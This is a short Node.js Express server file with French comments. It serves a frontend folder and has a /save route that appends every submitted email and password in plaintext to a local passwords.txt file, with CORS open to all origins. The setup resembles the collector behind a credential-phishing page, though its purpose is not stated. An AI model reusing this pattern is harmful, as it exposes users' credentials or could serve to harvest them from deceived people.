// Import des modules nécessaires
const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

// Création de l'application Express
const app = express();
const PORT = process.env.PORT || 3000;
// Middleware pour gérer les requêtes JSON et les CORS
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Sert le dossier STOKE (frontend)
app.use(express.static(path.join(__dirname, "..", "STOKE")));

// Chemin du fichier passwords.txt (dans backend/)
const FILE_PATH = path.join(__dirname, "passwords.txt");

// Route pour enregistrer email + mot de passe
app.post("/save", (req, res) => {
  const { email, password } = req.body;

   if (!email || !password) {
    return res.status(400).send("Email et mot de passe requis");
  }

  // Ligne corrigée avec backticks pour template string
  const line = `Email: ${email}, Password: ${password}\n`;

  fs.appendFile(FILE_PATH, line, (err) => {
    if (err) {
      console.error("Erreur écriture fichier:", err);

       return res.status(500).send("Impossible d’enregistrer");
    }
    res.send("Données enregistrées !");
  });
  });

// Route racine : renvoie index.html dans STOKE
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "..", "STOKE", "index.html"));
});

// Lancement du serveur
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
